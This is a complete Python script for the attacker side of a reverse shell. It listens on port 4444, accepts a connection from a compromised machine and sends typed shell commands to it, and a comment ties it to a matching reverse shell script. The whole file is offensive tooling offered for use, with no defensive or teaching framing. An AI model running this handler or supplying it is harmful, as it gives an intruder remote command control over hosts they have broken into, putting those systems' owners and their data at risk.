import socket

# Configure listener IP and port
LISTEN_IP = "0.0.0.0"  # Listen on all interfaces
LISTEN_PORT = 4444      # Same port as in the reverse shell script

# Create a socket and listen for connections
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(1)

print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...")
conn, addr = s.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]}")

# Interactive shell loop
try:
    while True:
        command = input("$ ")
        if command.strip().lower() in ("exit", "quit"):
            break
        conn.send(command.encode() + b"\n")
        response = conn.recv(4096).decode()
        print(response)
except KeyboardInterrupt:
    print("\n[!] Closing listener...")
finally:
    conn.close()
    s.close()